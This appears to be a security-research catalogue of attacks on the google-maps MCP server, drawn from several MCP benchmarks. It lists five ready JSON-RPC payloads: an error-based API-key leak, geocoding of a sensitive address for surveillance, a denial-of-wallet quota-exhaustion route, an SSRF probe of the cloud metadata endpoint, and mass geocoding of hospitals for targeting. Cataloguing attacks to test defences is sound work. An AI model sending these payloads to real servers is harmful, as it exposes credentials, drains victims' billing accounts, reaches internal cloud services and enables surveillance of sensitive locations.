# google-maps

## google-maps

- **Install:** `npm install -g @modelcontextprotocol/server-google-maps`
- **Benchmarks/Papers that attacked it:**
  - MCP-SafetyBench (arXiv:2512.15163) — Location Navigation domain (one of 5 domains)
  - MCPTox (openreview:xbs5dVGUQ8) — real-world location API tools tested
  - MCPSecBench (arXiv:2508.13220) — tool misuse and data exfiltration patterns

---

### Attack: API Key Exposure via Behavioral Fingerprinting

- **Category:** Credential theft / API key exposure (CWE-209)
- **Source:** MCP Server Dataset 67K (3 API keys found in wild); MCPSecBench
- **ASR:** Active exploitation documented
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "maps_geocode",
    "arguments": {
      "address": {"$where": "1==1"},
      "limit": -1
    }
  }
}
```
- **What it does:** Sends malformed arguments (object instead of string, negative limit) to elicit verbose error messages that reveal the server's Google Maps API key, base URL structure, or internal configuration.
- **Expected server response:** Validation error message revealing framework internals and potentially the API key in error context.

---

### Attack: Location Surveillance — Track Specific Address

- **Category:** Privacy violation / operational security threat (CWE-200)
- **Source:** MCP-SafetyBench; MCPTox
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "maps_geocode",
    "arguments": {
      "address": "1600 Pennsylvania Avenue NW, Washington, DC 20500"
    }
  }
}
```
- **What it does:** Geolocates a sensitive address (e.g., government building, private residence) using the server's Google Maps API key. At scale, this enables surveillance by consuming the API to track many addresses.
- **Expected server response:** Returns precise latitude/longitude coordinates, which combined with `maps_directions` can reveal travel routes.

---

### Attack: Denial-of-Wallet — Quota Exhaustion via Route Computation

- **Category:** Denial of wallet / API quota exhaustion (CWE-400)
- **Source:** MCPSecBench; MCP-SafetyBench
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "maps_directions",
    "arguments": {
      "origin": "New York, NY",
      "destination": "Los Angeles, CA",
      "mode": "driving",
      "alternatives": true,
      "waypoints": ["Chicago, IL", "Denver, CO", "Phoenix, AZ", "Las Vegas, NV", "Salt Lake City, UT", "Albuquerque, NM", "Oklahoma City, OK", "St. Louis, MO", "Nashville, TN", "Atlanta, GA"]
    }
  }
}
```
- **What it does:** Requests a complex multi-waypoint route with alternatives, consuming a large number of Google Maps API billing units per call. Repeated calls exhaust the server's daily/monthly Maps API quota.
- **Expected server response:** Returns route data; the server's Google Maps billing account is charged for each waypoint and alternative route computed.

---

### Attack: SSRF via Place Details — Custom URI

- **Category:** SSRF / open redirect (CWE-918)
- **Source:** MCPSecBench
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "method": "tools/call",
  "params": {
    "name": "maps_place_details",
    "arguments": {
      "place_id": "http://169.254.169.254/latest/meta-data/"
    }
  }
}
```
- **What it does:** Attempts to pass a URL instead of a Place ID. If the server constructs the Google Places API request using string interpolation without validation, the injected URL may cause the server to make an HTTP request to the internal metadata service.
- **Expected server response:** Google API error (invalid place ID) on safe implementations; SSRF to the metadata endpoint on vulnerable ones.

---

### Attack: Tool Misuse — Mass Geocode Scraping

- **Category:** Tool misuse / data scraping (CWE-441)
- **Source:** MCPTox; MCP-SafetyBench
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 5,
  "method": "tools/call",
  "params": {
    "name": "maps_geocode",
    "arguments": {
      "address": "all hospitals in New York City"
    }
  }
}
```
- **What it does:** Uses the Maps API to systematically geocode categories of sensitive locations (hospitals, shelters, military bases) for surveillance or targeting purposes, abusing the server's API key for unauthorized data collection.
- **Expected server response:** Returns geocoded results for the search query.
